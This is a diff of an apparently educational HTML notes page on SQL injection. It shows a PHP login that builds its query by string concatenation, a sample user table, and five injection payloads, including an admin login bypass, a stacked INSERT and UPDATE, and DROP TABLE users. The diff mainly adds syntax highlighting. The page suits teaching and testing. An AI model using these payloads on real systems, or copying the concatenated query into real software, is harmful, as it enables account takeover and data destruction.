@@ -591,37 +591,40 @@ min-height: 1em !important;
 }
 </style>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="../../../vendor/highlightjs-11.11.1/github.min.css">
 <link rel="stylesheet" href="../../../site.css">
-</head><body><article class="page sans"><header><div class="page-header-icon undefined"><span class="icon">📎</span></div><h1 class="page-title">Example 1</h1><p class="page-description"></p></header><div class="page-body"><p><mark class="highlight-teal">Example 1</mark></p><p>query checks if the provided username and password match an entry in the database</p><pre class="code"><code>&lt;?php
-// connect to database
-$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
-$query = "SELECT * FROM users WHERE user = '" . $_POST["user"] .
-"' AND password = '" . $_POST["password"] . "'";
-//if query is not empty - establish session with found query
-...
-?&gt;</code></pre><p>Our Database:</p><pre class="code"><code>user				password				age
+</head><body><article class="page sans"><header><div class="page-header-icon undefined"><span class="icon">📎</span></div><h1 class="page-title">Example 1</h1><p class="page-description"></p></header><div class="page-body"><p><mark class="highlight-teal">Example 1</mark></p><p>query checks if the provided username and password match an entry in the database</p><pre class="code"><code class="hljs language-php"><span class="hljs-meta">&lt;?php</span>
+	<span class="hljs-comment">// connect to database	</span>
+	<span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(CONNECTION_STRING, DB_USER, DB_PASS);
+&#9;
+	<span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE user = &#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user&quot;</span>] .&#32;
+	<span class="hljs-string">&quot;&#x27; AND password = &#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>] . <span class="hljs-string">&quot;&#x27;&quot;</span>;
+&#9;
+	<span class="hljs-comment">//if query is not empty - establish session with found query	</span>
+	...
+<span class="hljs-meta">?&gt;</span></code></pre><p>Our Database:</p><pre class="code"><code>user				password				age
 --------------------------------
 admin				1f4sdge!				37
 mauro				mkfln34.				30
 matteo			a4njDa!					42</code></pre><p>Legitimate Use Case:</p><pre class="code"><code>user: admin
-password: 1f4sdge!</code></pre><pre class="code"><code>SELECT * FROM users WHERE user='admin' AND password='1f4sdge!'</code></pre><p></p><p></p><p><mark class="highlight-teal">Exploit 1:</mark>
+password: 1f4sdge!</code></pre><pre class="code"><code class="hljs language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1f4sdge!&#x27;</span></code></pre><p></p><p></p><p><mark class="highlight-teal">Exploit 1:</mark>
 Authenticating as the admin.
 </p><p><mark class="highlight-gray"><code>--</code></mark><mark class="highlight-gray">followed by a space starts an inline comment</mark></p><pre class="code"><code>user: admin' -- -
-password: whatever</code></pre><pre class="code"><code>SELECT * FROM users WHERE user='admin' -- -' AND password='whatever'</code></pre><p></p><p><mark class="highlight-teal">Exploit 2:</mark>
+password: whatever</code></pre><pre class="code"><code class="hljs language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-comment">-- -&#x27; AND password=&#x27;whatever&#x27;</span></code></pre><p></p><p><mark class="highlight-teal">Exploit 2:</mark>
 Authenticating as the first user in the users list called admin
 </p><p>Less control than the previous payload.</p><p><mark class="highlight-gray"><code>%</code></mark><mark class="highlight-gray">matches an arbitrary sequence of characters - always satisfied</mark></p><pre class="code"><code>user: admin
-password: ' OR password LIKE '%</code></pre><pre class="code"><code>SELECT * FROM users WHERE user='admin' AND password='' OR password LIKE '%';</code></pre><p></p><p><mark class="highlight-teal">Exploit 3:</mark>
+password: ' OR password LIKE '%</code></pre><pre class="code"><code class="hljs language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">OR</span> password <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%&#x27;</span>;</code></pre><p></p><p><mark class="highlight-teal">Exploit 3:</mark>
 Adding a new user, damages data integrity
 </p><p>Only if stacked queries are enabled in the DB configuration.</p><pre class="code"><code>user: '; INSERT INTO users (user,password, age) VALUES ('attacker', 'mypwd', 1) -- -
-password: whatever</code></pre><pre class="code"><code>SELECT * FROM users WHERE user='';
-INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1)
--- -' AND password='whatever'</code></pre><p></p><p><mark class="highlight-teal">Exploit 4:</mark>
+password: whatever</code></pre><pre class="code"><code class="hljs language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-keyword">INSERT INTO</span> users (<span class="hljs-keyword">user</span>, password, age) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;attacker&#x27;</span>, <span class="hljs-string">&#x27;mypwd&#x27;</span>, <span class="hljs-number">1</span>)
+<span class="hljs-comment">-- -&#x27; AND password=&#x27;whatever&#x27;</span></code></pre><p></p><p><mark class="highlight-teal">Exploit 4:</mark>
 Editing the admins password
 </p><pre class="code"><code>user: '; UPDATE TABLE users SET password='newpwd' WHERE user='admin'-- -
-passwort: </code></pre><pre class="code"><code>SELECT * FROM users WHERE user='';
-UPDATE TABLE users SET password='newpwd' WHERE user='admin'
--- -' AND password=''</code></pre><p></p><p><mark class="highlight-teal">Exploit 5:</mark>
+passwort:&#32;</code></pre><pre class="code"><code class="hljs language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-keyword">SET</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;newpwd&#x27;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span>
+<span class="hljs-comment">-- -&#x27; AND password=&#x27;&#x27;</span></code></pre><p></p><p><mark class="highlight-teal">Exploit 5:</mark>
 Dropping the users table from the database
 </p><pre class="code"><code>user: '; DROP TABLE users -- -
-password: </code></pre><pre class="code"><code>SELECT * FROM users WHERE user='';
-DROP TABLE users -- -' AND password='';</code></pre></div></article></body></html>
+password:&#32;</code></pre><pre class="code"><code class="hljs language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-comment">-- -&#x27; AND password=&#x27;&#x27;;</span></code></pre></div></article></body></html>
